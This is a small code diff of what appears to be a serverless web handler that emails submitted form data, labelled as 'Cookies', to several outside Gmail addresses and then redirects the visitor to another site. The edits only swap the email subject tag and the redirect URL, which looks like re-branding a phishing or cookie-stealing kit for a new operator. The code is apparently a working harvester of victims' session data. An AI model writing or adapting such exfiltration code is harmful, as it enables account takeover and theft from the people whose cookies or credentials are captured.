@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <jsjjjaj671@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
-      subject: "AJJAZ Cookies",
+      subject: "AQIB Cookies",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(
         formData,
@@ -55,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://a-you-on-se.vercel.app/");
+  return res.redirect(302, "https://in-to-use-in000.vercel.app/");
 }
